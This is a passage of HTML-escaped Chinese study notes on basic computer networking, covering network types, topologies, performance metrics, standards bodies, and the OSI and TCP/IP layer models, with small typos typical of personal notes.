&lt;li&gt;掌握计算机网络的类型和衡量计算机网络的性能指标&lt;/li&gt;
&lt;li&gt;了解计算机网络的协议标准及其标准化组织&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;目录-1&#34;&gt;目录&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;计算机网络的定义和基本功能&lt;/li&gt;
&lt;li&gt;计算机网络的演进&lt;/li&gt;
&lt;li&gt;计算机网络的类型&lt;/li&gt;
&lt;li&gt;衡量计算机网络的性能指标&lt;/li&gt;
&lt;li&gt;网络标准化组织&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;计算机网络的定义&#34;&gt;计算机网络的定义&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;计算机网络是一组自治计算机互联的集合&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;自治：能够自主独立运行，离开其他工作单元也能独立工作&lt;/li&gt;
&lt;li&gt;互联：群体&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200417011534.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;计算机网络的基本功能&#34;&gt;计算机网络的基本功能&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;资源共享&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;打印机，配置一个服务器，多个员工使用一个打印机&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;分布式处理与负载均衡&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;通过计算机网络处理海量的相同的任务，任务分布在全世界各地，访问同一台服务器响应时间长效率低&lt;/li&gt;
&lt;li&gt;通过相应的技术手段（软&amp;amp;硬件），F5 A10，服务器或者和线路上的负载均衡&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;综合信息服务&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;在一套系统上提供多种服务，北京市政交通一卡通&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;计算机网络的演进&#34;&gt;计算机网络的演进&lt;/h3&gt;
&lt;p&gt;计算机网络是计算机技术和通信技术相结合的产物，早期不叫计算机网络叫做主机的互联，通过低速的串行电路连接到一起。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PSTN（Public Switched Telephone Network）：公共电话交换网络&lt;/li&gt;
&lt;li&gt;局域网：共享式的网络（1 v N）&lt;/li&gt;
&lt;li&gt;互联网（internet）：路由器（协议转换器）&lt;/li&gt;
&lt;li&gt;因特网（Internet）：ISP的介入&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200417012423.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;局域网城域网和广域网&#34;&gt;局域网、城域网和广域网&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;LAN（Local Area Network）
&lt;ul&gt;
&lt;li&gt;通常指几千米以内的，可以通过某种介质互联的计算机、打印机、modem或其他设备的集合&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MAN（Metropolitan Area Network）
&lt;ul&gt;
&lt;li&gt;MAN覆盖范围为中等规模，介于局域网和广域网之间，通常是在一个城市内的网络连接（距离为10KM左右）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;WAN（Wide Area Network）
&lt;ul&gt;
&lt;li&gt;分布距离远，它通过各种类型的串行连接以便在更大的地理取余内实现接入&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;网络的拓扑结构&#34;&gt;网络的拓扑结构&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;总线型：每一个分支机构都连接到相同的总线上
&lt;ul&gt;
&lt;li&gt;接入的终端越多，每个终端获取的带宽资源越少，带宽影响了总线型的发展，并且不利于网络的强壮性，没有相应的冗余&lt;/li&gt;
&lt;li&gt;缺点很明显，有一个地方出现故障，后续所有的设备节点都无法再进行通信&lt;/li&gt;
&lt;li&gt;优点很明显，结构简单，成本非常低，安装非常方便&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;星型：由一个中心节点向四方节点扩散
&lt;ul&gt;
&lt;li&gt;具备一定的可靠性，分支机构出现问题不会影响其他分支结构，但是中心节点出现问题是也会影响到分支结构&lt;/li&gt;
&lt;li&gt;是当今网络当中使用较为广泛的拓扑结构&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;树型：星型拓扑结构的分层&lt;/li&gt;
&lt;li&gt;部分网状：&lt;/li&gt;
&lt;li&gt;全网状：线路成本高，n(n-1)/2，有可能线路成本高于节点成本&lt;/li&gt;
&lt;li&gt;环型：城域网使用较多，提供一种冗余性，可以是单向/双向&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200417015135.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;电路交换与分组交换&#34;&gt;电路交换与分组交换&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;电路交换：基于电话网的电路交换&lt;/strong&gt;（PSDN）
&lt;ul&gt;
&lt;li&gt;优点：延迟小、透明传输&lt;/li&gt;
&lt;li&gt;缺点：带宽固定，网络资源利用率低，初始连接建立慢&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;分组交换：以分组为单位存储转发&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;优点：多路复用，网络资源利用率高&lt;/li&gt;
&lt;li&gt;缺点：延迟大，实时性差，设备功能复杂&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;衡量计算机网络的性能指标&#34;&gt;衡量计算机网络的性能指标&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;带宽（bandwidth）&lt;/strong&gt;：衡量网络快慢的指标&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;描述在一定时间范围内能够从一个节点传送到另一个节点的数据量&lt;/li&gt;
&lt;li&gt;通常以bps(bit/s)为单位&lt;/li&gt;
&lt;li&gt;例如以外网带宽为10Mbps，快速以太网为100Mbps&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;延迟（delay）&lt;/strong&gt;：衡量网络介质和中间设备能力的指标&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;描述网络上数据从一个节点传送到另一个节点所经历的时间&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;**抖动：**衡量网络的稳定性，延迟的绝对值，延迟一直都是100ms，没变过，就是0&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;**丢包率：**代表数据转发能否到达正确的目的地，A发送100个包，B收到了100个包，丢包率为0&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;网络标准化组织&#34;&gt;网络标准化组织&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;国际标准化组织（ISO）&lt;/li&gt;
&lt;li&gt;电子电器工程师协会（IEEE）&lt;/li&gt;
&lt;li&gt;美国国家标准局（ANSI）&lt;/li&gt;
&lt;li&gt;国际电信联盟（ITU）&lt;/li&gt;
&lt;li&gt;INTERNET架构委员会（IAB）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;本章总结&#34;&gt;本章总结&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;计算机网络可以实现资源共享、综合信息服务、负载均衡与分布式处理等基本功能&lt;/li&gt;
&lt;li&gt;计算机网络的类型可以按照地域、拓扑结构、数据交换的形式及网络组件等不同类型进行分类&lt;/li&gt;
&lt;li&gt;衡量计算机网络的性能指标有很多种，其中带宽和延迟最为重要&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;习题总结&#34;&gt;习题总结&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;计算机网络定义&lt;/p&gt;
&lt;p&gt;计算机网络是一组自治计算机互联的集合（IEEEE 高级委员 坦尼鲍姆）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;计算机网络的基本功能&lt;/p&gt;
&lt;p&gt;a. 资源共享（软件共享、硬件共享）&lt;/p&gt;
&lt;p&gt;b. 分布式处理&lt;/p&gt;
&lt;p&gt;c. 综合信息服务&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;计算机网络的演进&lt;/p&gt;
&lt;p&gt;a. 主机互联&lt;/p&gt;
&lt;p&gt;b. 局域网&lt;/p&gt;
&lt;p&gt;c. 互联网&lt;/p&gt;
&lt;p&gt;d. 因特网&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;计算机网络类型（概念及特点）：&lt;/p&gt;
&lt;p&gt;a. 局域网&lt;/p&gt;
&lt;p&gt;b. 城域网&lt;/p&gt;
&lt;p&gt;c. 广域网&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;计算机网络拓扑结构（各类型的稳定性）&lt;/p&gt;
&lt;p&gt;a. 总线型拓扑&lt;/p&gt;
&lt;p&gt;b. 星型拓扑&lt;/p&gt;
&lt;p&gt;c. 环形拓扑&lt;/p&gt;
&lt;p&gt;d. 网状拓扑&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;计算机网络数据传输&lt;/p&gt;
&lt;p&gt;a. 电路交换（电话网特点）&lt;/p&gt;
&lt;p&gt;b. 分组交换（复用、利用率高）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;计算机网络指标&lt;/p&gt;
&lt;p&gt;a. 带宽&lt;/p&gt;
&lt;p&gt;b. 延迟&lt;/p&gt;
&lt;p&gt;c. 抖动&lt;/p&gt;
&lt;p&gt;d. 丢包率&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;计算机网网络标准化组织&lt;/p&gt;
&lt;p&gt;a. 国际标准化组织ISO&lt;/p&gt;
&lt;p&gt;b. 电气和电子工程师协会IEEE&lt;/p&gt;
&lt;p&gt;c. 美国国家标准协会ANSI&lt;/p&gt;
&lt;p&gt;d. 国际电信联盟ITU&lt;/p&gt;
&lt;p&gt;e. 因特网工程任务组IETF&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;2-osi参考模型与tcpip模型&#34;&gt;2. OSI参考模型与TCP/IP模型&lt;/h2&gt;
&lt;h3 id=&#34;引入&#34;&gt;引入&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;伴随着计算机网络的飞跃发展，各大厂商根据自己的协议生产出了 不同的硬件和软件&lt;/li&gt;
&lt;li&gt;为了实现网络设备间的互相通讯，ISO和IEEE相继提出了OSI参考模型及TCP/IP模型&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;课程目标-1&#34;&gt;课程目标&lt;/h3&gt;
&lt;p&gt;学习完本课程，你应该能够：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;了解OSI参考模型和TCP/IP模型的产生背景&lt;/li&gt;
&lt;li&gt;理解OSI参考模型和TCP/IP模型的层次结构及相关概念&lt;/li&gt;
&lt;li&gt;理解OSI参考模型和TCP/IP模型各层的功能&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;osi参考模型&#34;&gt;OSI参考模型&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;OSI参考模型定义了网络中设备所遵守的层次结构&lt;/li&gt;
&lt;li&gt;分层结构的优点：
&lt;ul&gt;
&lt;li&gt;开放的标准化接口&lt;/li&gt;
&lt;li&gt;多厂商兼容性&lt;/li&gt;
&lt;li&gt;易于理解、学习和更新协议标准&lt;/li&gt;
&lt;li&gt;实现模块化工程，降低了开发实现的复杂度&lt;/li&gt;
&lt;li&gt;便于故障排除&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;osi参考模型层次结构&#34;&gt;OSI参考模型层次结构&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200417110700.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;物理层&#34;&gt;物理层&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;作用：定义电压、接口、线缆标准、传输距离等&lt;/li&gt;
&lt;li&gt;物理层介质：
&lt;ul&gt;
&lt;li&gt;同轴电缆（coaxial cable）：细缆和粗缆&lt;/li&gt;
&lt;li&gt;双绞线（twisted pair）：UTP、STP&lt;/li&gt;
&lt;li&gt;光纤（fiber）：单模、多模&lt;/li&gt;
&lt;li&gt;无线（wireless）：红外线、蓝牙Blue Tooth、WLAN技术&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;典型物理层标准和设备&#34;&gt;典型物理层标准和设备&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;物理层介质
&lt;ul&gt;
&lt;li&gt;双绞线、同轴电缆、光纤、无线电信号等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;局域网物理层
&lt;ul&gt;
&lt;li&gt;常见标准：10Base-T、100Base-TX/FX、1000Base-T、1000Base-SX/LX&lt;/li&gt;
&lt;li&gt;常见设备：中继器、集线器&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;广域网物理层
&lt;ul&gt;
&lt;li&gt;常见标准：RS-232、V.24、V.35&lt;/li&gt;
&lt;li&gt;常见设备：Modem&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;数据链路层&#34;&gt;数据链路层&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;功能：
&lt;ul&gt;
&lt;li&gt;编帧和识别帧&lt;/li&gt;
&lt;li&gt;数据链路的建立、维持和释放&lt;/li&gt;
&lt;li&gt;传输资源控制&lt;/li&gt;
&lt;li&gt;流量控制&lt;/li&gt;
&lt;li&gt;差错验证&lt;/li&gt;
&lt;li&gt;寻址&lt;/li&gt;
&lt;li&gt;标识上层数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;局域网数据链路层分为LLC子层和MAC子层&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;典型数据链路层标准&#34;&gt;典型数据链路层标准&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;局域网数据链路层标准&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IEEE 802.1：基本局域网问题&lt;/li&gt;
&lt;li&gt;IEEE 802.2：定义LLC子层&lt;/li&gt;
&lt;li&gt;IEEE 802.3：以太网标准&lt;/li&gt;
&lt;li&gt;IEEE 802.4：令牌总线网&lt;/li&gt;
&lt;li&gt;IEEE 802.5：令牌环网&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;广域网数据链路层标准&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HDLC&lt;/li&gt;
&lt;li&gt;PPP&lt;/li&gt;
&lt;li&gt;Frame Relay&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;网络层&#34;&gt;网络层&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;编址：ip&lt;/li&gt;
&lt;li&gt;路由&lt;/li&gt;
&lt;li&gt;拥塞控制&lt;/li&gt;
&lt;li&gt;异种网络互连&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;网络层地址&#34;&gt;网络层地址&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;网络层地址通常由两部分组成
&lt;ul&gt;
&lt;li&gt;网络地址&lt;/li&gt;
&lt;li&gt;主机地址&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;网络层地址是全局唯一的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200418004311.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;路由协议于可路由协议&#34;&gt;路由协议于可路由协议&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;可路由协议（routed protocol）定义数据包内各个字段的格式和用途，怼数据进行网络层封装&lt;/li&gt;
&lt;li&gt;路由协议（routing protocol）在路由器之间传递信息，计算路由并形成路由表，为可路由协议选择路径&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200418004520.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;面向连接和无连接的服务&#34;&gt;面向连接和无连接的服务&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;面向连接的服务
&lt;ul&gt;
&lt;li&gt;在通信之前先建立连接，通信完成后断开连接&lt;/li&gt;
&lt;li&gt;有序传递&lt;/li&gt;
&lt;li&gt;应答确认&lt;/li&gt;
&lt;li&gt;差错重传&lt;/li&gt;
&lt;li&gt;适合于对可靠性要求高的应用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;无连接的服务
&lt;ul&gt;
&lt;li&gt;尽力而为的服务&lt;/li&gt;
&lt;li&gt;无需建立连接&lt;/li&gt;
&lt;li&gt;无序列号机制，无确认机制，无重传机制&lt;/li&gt;
&lt;li&gt;适合于对延迟敏感的应用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;网络层协议操作&#34;&gt;网络层协议操作&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200418010739.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;传输层&#34;&gt;传输层&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;传输层功能：
&lt;ul&gt;
&lt;li&gt;分段上层数据&lt;/li&gt;
&lt;li&gt;建立端到端连接&lt;/li&gt;
&lt;li&gt;透明、可靠传输&lt;/li&gt;
&lt;li&gt;流量控制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;传输层协议
&lt;ul&gt;
&lt;li&gt;主要有TCP/IP协议族的TCP协议和UDP协议，以及IPX/SPX协议组的SPX协议等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;会话层&#34;&gt;会话层&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;主机间通信&lt;/li&gt;
&lt;li&gt;建立、维护、终结应用程序之间的会话&lt;/li&gt;
&lt;li&gt;文字处理、邮件、电子表格等&lt;/li&gt;
&lt;li&gt;ASCII、MPEG、JPEG等&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;表示层&#34;&gt;表示层&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;定义数据格式于结构&lt;/li&gt;
&lt;li&gt;协商上层数据格式&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;应用层&#34;&gt;应用层&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;为应用程序进程（比如文字处理、邮件、电子表格）提供网络服务&lt;/li&gt;
&lt;li&gt;SQL、NFS、RPC等&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;对等通信&#34;&gt;对等通信&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;每一层都使用自己的协议&lt;/li&gt;
&lt;li&gt;每一层都利用下层提供的服务与对等层通信&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200417110843.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;数据封装与解封装&#34;&gt;数据封装与解封装&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200417110957.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;tcpip模型的层次结构&#34;&gt;TCP/IP模型的层次结构&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;应用层&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;负责处理特定的应用程序细节&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;远程访问&lt;/li&gt;
&lt;li&gt;资源共享&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;主要协议&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Telnet&lt;/li&gt;
&lt;li&gt;FTP/TFTP&lt;/li&gt;
&lt;li&gt;SMTP/POP3&lt;/li&gt;
&lt;li&gt;SNMP/HTTP&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;传输层&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;负责端到端通信&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;数据完整性校验&lt;/li&gt;
&lt;li&gt;差错重传&lt;/li&gt;
&lt;li&gt;数据的重新排序&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;主要协议&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;TCP&lt;/li&gt;
&lt;li&gt;UDP&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;网络层&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;负责将数据包送达正确的目的&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;数据包的路由&lt;/li&gt;
&lt;li&gt;路由的维护&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;主要协议&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;IP&lt;/li&gt;
&lt;li&gt;ICMP&lt;/li&gt;
&lt;li&gt;IGMP&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;网络接口层&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;负责处理于传输介质相关的细节&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;物理线路和接口&lt;/li&gt;
&lt;li&gt;链路层通信&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;主要协议&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;以太网/FDDI/令牌环&lt;/li&gt;
&lt;li&gt;SLIP/HDLC/PPP&lt;/li&gt;
&lt;li&gt;X.25/帧中继/ATM&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200418013028.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;本章总结-1&#34;&gt;本章总结&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;OSI参考模型和TCP/IP的出现，为清晰地理解互联网络、开发网络产品和网络设计等带来了极大的方便，推动了计算机网络的飞速发展&lt;/li&gt;
&lt;li&gt;OSI参考模型分为七层结构，而TCP/IP模型分为四层结构&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;习题总结-1&#34;&gt;习题总结&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;国际标准化组织ISO定义了网络OSI七层参考模型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;网络分层结构的优点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;开放的标准化接口&lt;/li&gt;
&lt;li&gt;多厂商兼容性&lt;/li&gt;
&lt;li&gt;易于理解、学习和更新协议标准&lt;/li&gt;
&lt;li&gt;实现模块化工程，降低了开发实现的复杂度&lt;/li&gt;
&lt;li&gt;便于故障排除&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;OSI七层参考模型分为：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;层次&lt;/th&gt;
&lt;th&gt;名称&lt;/th&gt;
&lt;th&gt;数据单元名称&lt;/th&gt;
&lt;th&gt;功能&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;7层&lt;/td&gt;
&lt;td&gt;应用层&lt;/td&gt;
&lt;td&gt;APDU&lt;/td&gt;
&lt;td&gt;提供应用程序间通信&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6层&lt;/td&gt;
&lt;td&gt;表示层&lt;/td&gt;
&lt;td&gt;PPDU&lt;/td&gt;
&lt;td&gt;处理数据格式、数据加密等&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5层&lt;/td&gt;
&lt;td&gt;会化层&lt;/td&gt;
&lt;td&gt;SPUD&lt;/td&gt;
&lt;td&gt;建立、维护和管理会话&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4层&lt;/td&gt;
&lt;td&gt;传输层&lt;/td&gt;
&lt;td&gt;Segment（段）&lt;/td&gt;
&lt;td&gt;建立主机端到端连接&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3层&lt;/td&gt;
&lt;td&gt;网络层&lt;/td&gt;
&lt;td&gt;Packet（包）&lt;/td&gt;
&lt;td&gt;寻址和路由选择&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2层&lt;/td&gt;
&lt;td&gt;数据链路层&lt;/td&gt;
&lt;td&gt;Frame（帧）&lt;/td&gt;
&lt;td&gt;提供介质访问、链路管理等&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1层&lt;/td&gt;
&lt;td&gt;物理层&lt;/td&gt;
&lt;td&gt;Bit（比特）&lt;/td&gt;
&lt;td&gt;比特流传输&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;路由协议与可路由协议&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可路由协议定义数据包内各个字段的格式和用途，对数据进行网络层封装（运输的货物）&lt;/li&gt;
&lt;li&gt;路由协议在路由器之间传递信息，计算路由并形成路由表，为可路由协议选择路径（运输的工具）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;面向连接和无连接的服务&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;面向连接的服务（打电话）
&lt;ul&gt;
&lt;li&gt;通信之前先建立连接，通信完成后断开连接&lt;/li&gt;
&lt;li&gt;有序传递&lt;/li&gt;
&lt;li&gt;应答确认&lt;/li&gt;
&lt;li&gt;差错重传&lt;/li&gt;
&lt;li&gt;适合对可靠性要求高的应用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;无连接的服务（看电视直播）
&lt;ul&gt;
&lt;li&gt;尽力而为的服务&lt;/li&gt;
&lt;li&gt;无需建立连接&lt;/li&gt;
&lt;li&gt;无序列号机制，无确认机制，无重传机制&lt;/li&gt;
&lt;li&gt;适合对延迟敏感的应用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;3-局域网基本原理&#34;&gt;3. 局域网基本原理&lt;/h2&gt;
&lt;h3 id=&#34;引入-1&#34;&gt;引入&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;局域网覆盖的范围较小，带宽较高，通常用于建筑内部、园区范围内的专用网络&lt;/li&gt;
&lt;li&gt;在众多的局域网协议种，以太网占据着统治地位&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;课程目标-2&#34;&gt;课程目标&lt;/h3&gt;
&lt;p&gt;学习完本课程，你应该能够：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;了解局域网类型&lt;/li&gt;
&lt;li&gt;掌握主要以太网类型及其主要特性&lt;/li&gt;
&lt;li&gt;掌握CSMA/CD工作原理&lt;/li&gt;
&lt;li&gt;了解以太网传输介质种双绞线和光纤知识&lt;/li&gt;
&lt;li&gt;了解WLAN技术基本原理&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;目录-2&#34;&gt;目录&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;局域网概述&lt;/li&gt;
